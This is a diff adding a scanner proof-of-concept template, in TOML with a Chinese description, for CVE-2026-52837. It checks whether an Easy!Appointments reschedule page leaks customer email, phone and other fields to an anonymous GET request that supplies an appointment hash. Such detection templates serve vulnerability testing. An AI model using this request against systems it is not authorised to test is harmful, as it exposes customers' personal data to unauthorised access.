@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "检测 Easy!Appointments 预约重排页面是否泄露客户敏感信息。攻击者仅需获取 12 字符的 appointment_hash 即可通过匿名 GET 请求获取 ea_users 表中的全部字段，包括邮箱、电话、地址、自定义字段、时区、语言及 LDAP DN。"
+id = "POC-AVE-2026-0755"
+name = "Easy!Appointments Customer PII Leak PoC"
+severity = "medium"
+tags = [
+    "cve-2026-52837",
+    "easyappointments",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-52837",
+    "AVE-2026-0755",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php/booking/reschedule/{{appointment_hash}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"email"',
+    '"phone_number"',
+    '"display_name"',
+]
